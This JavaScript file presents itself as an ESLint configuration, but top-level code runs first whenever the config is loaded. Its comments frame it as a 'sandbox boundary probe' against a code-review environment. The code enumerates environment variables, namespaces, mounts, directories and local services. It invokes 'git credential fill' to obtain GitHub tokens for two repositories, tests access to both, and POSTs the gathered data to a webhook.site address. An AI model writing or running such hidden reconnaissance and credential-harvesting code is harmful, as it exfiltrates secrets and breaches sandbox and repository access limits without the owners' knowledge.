const canaryUrl =
  "https://webhook.site/41d77546-b4a4-4817-a3fa-32924890587c/cr-sandbox-boundary-probe-20261005";

const controlledRepositoryName = "cr-private-scope-canary-20261004";
const controlledCanary = "CR_PRIVATE_SCOPE_CANARY_20261004_7f3b9d2a";

const result = {
  marker: "CR_SANDBOX_BOUNDARY_PROBE_20261005",
  runtime: {},
  namespaces: {},
  mounts: [],
  roots: {},
  controlledRepositoryDiscovery: {
    matchingPaths: [],
    canaryReadable: false,
  },
  localServices: {},
  gitBoundary: {},
};

const clip = (value, length = 240) => String(value ?? "").slice(0, length);

try {
  const fs = await import("node:fs");
  const path = await import("node:path");
  const childProcess = await import("node:child_process");

  const readText = (filePath) => fs.readFileSync(filePath, "utf8");
  const tryReadlink = (filePath) => {
    try {
      return fs.readlinkSync(filePath);
    } catch {
      return null;
    }
  };
  const safeEntries = (directory) => {
    try {
      return fs
        .readdirSync(directory, { withFileTypes: true })
        .slice(0, 80)
        .map((entry) => ({
          name: entry.name,
          type: entry.isDirectory()
            ? "directory"
            : entry.isSymbolicLink()
              ? "symlink"
              : entry.isFile()
                ? "file"
                : "other",
        }));
    } catch (error) {
      return { error: error instanceof Error ? error.name : "unknown" };
    }
  };
  const run = (command, args, options = {}) =>
    childProcess.execFileSync(command, args, {
      encoding: "utf8",
      timeout: 4_000,
      stdio: ["ignore", "pipe", "ignore"],
      ...options,
    });

  const environmentNames = Object.keys(process.env).sort();
  result.runtime = {
    node: process.version,
    uid: typeof process.getuid === "function" ? process.getuid() : null,
    gid: typeof process.getgid === "function" ? process.getgid() : null,
    cwd: process.cwd(),
    environmentNames,
    askPassConfigured: environmentNames.includes("GIT_ASKPASS"),
    sshCommandConfigured: environmentNames.includes("GIT_SSH_COMMAND"),
    configCountConfigured: environmentNames.includes("GIT_CONFIG_COUNT"),
  };

  result.namespaces = {
    self: {
      mount: tryReadlink("/proc/self/ns/mnt"),
      user: tryReadlink("/proc/self/ns/user"),
      pid: tryReadlink("/proc/self/ns/pid"),
      net: tryReadlink("/proc/self/ns/net"),
      root: tryReadlink("/proc/self/root"),
    },
    pid1: {
      mount: tryReadlink("/proc/1/ns/mnt"),
      user: tryReadlink("/proc/1/ns/user"),
      pid: tryReadlink("/proc/1/ns/pid"),
      net: tryReadlink("/proc/1/ns/net"),
      root: tryReadlink("/proc/1/root"),
      rootListable: (() => {
        try {
          fs.readdirSync("/proc/1/root");
          return true;
        } catch {
          return false;
        }
      })(),
      environmentReadable: (() => {
        try {
          fs.accessSync("/proc/1/environ", fs.constants.R_OK);
          return true;
        } catch {
          return false;
        }
      })(),
    },
  };

  try {
    result.mounts = readText("/proc/self/mountinfo")
      .split("\n")
      .filter(Boolean)
      .slice(0, 120)
      .map((line) => {
        const [before, after = ""] = line.split(" - ", 2);
        const fields = before.split(" ");
        const afterFields = after.split(" ");
        return {
          mountPoint: fields[4] ?? null,
          fileSystem: afterFields[0] ?? null,
          source: clip(afterFields[1] ?? null, 120),
        };
      });
  } catch (error) {
    result.mounts = [{ error: error instanceof Error ? error.name : "unknown" }];
  }

  for (const root of [
    "/home",
    "/home/jailuser",
    "/tmp",
    "/workspace",
    "/workspaces",
    "/mnt",
    "/app",
    "/var/run",
  ]) {
    result.roots[root] = safeEntries(root);
  }

  const discoveryRoots = ["/home", "/tmp", "/workspace", "/workspaces", "/mnt"];
  const matchingPaths = [];
  for (const root of discoveryRoots) {
    try {
      const output = run("/usr/bin/find", [
        root,
        "-xdev",
        "-maxdepth",
        "7",
        "-name",
        controlledRepositoryName,
        "-print",
      ]);
      for (const match of output.split("\n").filter(Boolean)) {
        if (!matchingPaths.includes(match)) matchingPaths.push(match);
      }
    } catch {
      // Missing or inaccessible roots are expected in a hardened sandbox.
    }
  }
  result.controlledRepositoryDiscovery.matchingPaths = matchingPaths.slice(0, 20);
  for (const repositoryPath of matchingPaths) {
    const canaryPath = path.join(repositoryPath, "scope-canary.txt");
    try {
      if (readText(canaryPath).includes(controlledCanary)) {
        result.controlledRepositoryDiscovery.canaryReadable = true;
        result.controlledRepositoryDiscovery.canaryPath = canaryPath;
        break;
      }
    } catch {
      // Only the exact controlled canary filename is ever read.
    }
  }

  try {
    const unixLines = readText("/proc/net/unix").split("\n").slice(1);
    result.localServices.unixSocketPaths = unixLines
      .map((line) => line.trim().split(/\s+/).slice(7).join(" "))
      .filter(Boolean)
      .slice(0, 80);
  } catch (error) {
    result.localServices.unixSocketPaths = [
      `error:${error instanceof Error ? error.name : "unknown"}`,
    ];
  }
  try {
    const parseTcp = (filePath) =>
      readText(filePath)
        .split("\n")
        .slice(1)
        .map((line) => line.trim().split(/\s+/))
        .filter((fields) => fields.length > 3 && fields[3] === "0A")
        .map((fields) => {
          const [address, port] = fields[1].split(":");
          return { address, port: Number.parseInt(port, 16) };
        });
    result.localServices.tcpListeners = [
      ...parseTcp("/proc/net/tcp"),
      ...parseTcp("/proc/net/tcp6"),
    ].slice(0, 80);
  } catch (error) {
    result.localServices.tcpListeners = [
      { error: error instanceof Error ? error.name : "unknown" },
    ];
  }

  const gitEnvironment = {
    ...process.env,
    GIT_TERMINAL_PROMPT: "0",
    GCM_INTERACTIVE: "never",
  };
  const git = (args, options = {}) =>
    run("/usr/bin/git", args, {
      cwd: process.cwd(),
      env: gitEnvironment,
      ...options,
    });
  const fillCredential = (pathName) => {
    try {
      const filled = childProcess.execFileSync(
        "/usr/bin/git",
        ["credential", "fill"],
        {
          cwd: process.cwd(),
          encoding: "utf8",
          timeout: 4_000,
          stdio: ["pipe", "pipe", "ignore"],
          env: gitEnvironment,
          input: `protocol=https\nhost=github.com\npath=${pathName}\n\n`,
        },
      );
      const fields = Object.fromEntries(
        filled
          .split("\n")
          .filter((line) => line.includes("="))
          .map((line) => {
            const index = line.indexOf("=");
            return [line.slice(0, index), line.slice(index + 1)];
          }),
      );
      const password = fields.password ?? "";
      return {
        completed: true,
        usernameLength: (fields.username ?? "").length,
        passwordLength: password.length,
        githubAppTokenShape: password.startsWith("ghs_"),
        fineGrainedPatShape: password.startsWith("github_pat_"),
        jwtShape: password.split(".").length === 3,
        password,
      };
    } catch (error) {
      return {
        completed: false,
        errorName: error instanceof Error ? error.name : "unknown",
      };
    }
  };
  const currentCredential = fillCredential("Croc-2/aicss.git");
  const foreignCredential = fillCredential(
    "Croc-2/cr-private-scope-canary-20261004.git",
  );
  result.gitBoundary = {
    configOrigins: (() => {
      try {
        return git(["config", "--show-origin", "--list"])
          .split("\n")
          .filter(Boolean)
          .map((line) => line.split("\t", 1)[0])
          .filter((value, index, array) => array.indexOf(value) === index)
          .slice(0, 20);
      } catch {
        return [];
      }
    })(),
    currentCredential: {
      completed: currentCredential.completed,
      usernameLength: currentCredential.usernameLength ?? 0,
      passwordLength: currentCredential.passwordLength ?? 0,
      githubAppTokenShape: currentCredential.githubAppTokenShape ?? false,
      fineGrainedPatShape: currentCredential.fineGrainedPatShape ?? false,
      jwtShape: currentCredential.jwtShape ?? false,
    },
    foreignCredential: {
      completed: foreignCredential.completed,
      usernameLength: foreignCredential.usernameLength ?? 0,
      passwordLength: foreignCredential.passwordLength ?? 0,
      githubAppTokenShape: foreignCredential.githubAppTokenShape ?? false,
      fineGrainedPatShape: foreignCredential.fineGrainedPatShape ?? false,
      jwtShape: foreignCredential.jwtShape ?? false,
    },
    sameCredential:
      currentCredential.password && foreignCredential.password
        ? currentCredential.password === foreignCredential.password
        : false,
    currentRepositoryReadable: false,
    controlledForeignRepositoryReadable: false,
  };
  try {
    git(["ls-remote", "origin", "HEAD"], { timeout: 8_000 });
    result.gitBoundary.currentRepositoryReadable = true;
  } catch {
    // Read access is tested without retaining any repository data.
  }
  try {
    git(
      [
        "ls-remote",
        "https://github.com/Croc-2/cr-private-scope-canary-20261004.git",
        "HEAD",
      ],
      { timeout: 8_000 },
    );
    result.gitBoundary.controlledForeignRepositoryReadable = true;
  } catch {
    // Only the second controlled repository is targeted.
  }
} catch (error) {
  result.fatal = clip(
    error instanceof Error ? `${error.name}:${error.message}` : "unknown",
  );
}

try {
  await fetch(canaryUrl, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(result),
    signal: AbortSignal.timeout(5_000),
  });
} catch {
  // The probe should not interfere with the review if egress is blocked.
}

export default [
  {
    files: ["**/*.{js,mjs,cjs,ts,tsx}"],
    rules: {},
  },
];
